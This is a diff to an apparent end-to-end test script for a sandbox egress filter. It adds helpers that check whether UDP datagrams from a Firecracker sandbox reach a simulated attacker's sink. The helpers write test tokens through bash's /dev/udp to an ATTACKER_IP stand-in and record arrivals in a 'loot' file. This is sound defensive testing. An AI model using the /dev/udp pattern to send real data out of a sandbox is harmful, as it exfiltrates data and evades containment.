@@ -34,6 +34,7 @@ ATTACKER_GW=10.99.0.254
 ATTACKER_PORT=8080
 ATTACKER_HOLD_PORT=9000
 ATTACKER_DNS_PORT=5353
+ATTACKER_UDP_PORT=9999
 
 UPLINK="$(ip -4 route show default | awk '{for (i=1;i<NF;i++) if ($i=="dev") print $(i+1); exit}')"
 HOST_IP="$(ip -4 -o addr show dev "$UPLINK" | awk '{split($4,a,"/"); print a[1]; exit}')"
@@ -131,7 +132,8 @@ setup_attacker() {
 	: >"$ATTACKER_LOOT"
 	ip netns exec "$ATTACKER_NS" python3 "$E2E_DIR/attacker.py" --bind "$ATTACKER_IP" \
 		--port "$ATTACKER_PORT" --loot "$ATTACKER_LOOT" \
-		--hold-port "$ATTACKER_HOLD_PORT" --dns-port "$ATTACKER_DNS_PORT" >"$T/attacker.log" 2>&1 &
+		--hold-port "$ATTACKER_HOLD_PORT" --dns-port "$ATTACKER_DNS_PORT" --udp-port "$ATTACKER_UDP_PORT" \
+		>"$T/attacker.log" 2>&1 &
 	for _ in $(seq 50); do
 		curl -s -m 1 "http://$ATTACKER_IP:$ATTACKER_PORT/" >/dev/null && return 0
 		sleep 0.1
@@ -213,6 +215,26 @@ wait_guest() {
 # fc_api <id> <path>: GET from the sandbox's Firecracker API.
 fc_api() {
 	curl -s --unix-socket "$(sb_field "$1" .vm.jail_root)/run/firecracker.socket" "http://localhost$2"
+}
+
+# udp_delivered <sandbox> <desc>: send a unique UDP datagram from the
+# sandbox to the attacker's UDP sink and check that it arrived.
+udp_delivered() {
+	local token="udp-$RANDOM-$RANDOM"
+	sbx "$1" bash -c "echo $token >/dev/udp/$ATTACKER_IP/$ATTACKER_UDP_PORT"
+	for _ in $(seq 30); do
+		grep -q "^udp: $token\$" "$ATTACKER_LOOT" && { pass "$2"; return; }
+		sleep 0.1
+	done
+	fail "$2 (datagram $token never arrived)"
+}
+
+# udp_not_delivered <sandbox> <desc>: the datagram must not arrive.
+udp_not_delivered() {
+	local token="udp-$RANDOM-$RANDOM"
+	sbx "$1" bash -c "echo $token >/dev/udp/$ATTACKER_IP/$ATTACKER_UDP_PORT"
+	sleep 1
+	if grep -q "^udp: $token\$" "$ATTACKER_LOOT"; then fail "$2 (datagram $token arrived)"; else pass "$2"; fi
 }
 
 # assert_no_remnants: nothing egressd-owned is left on the host.
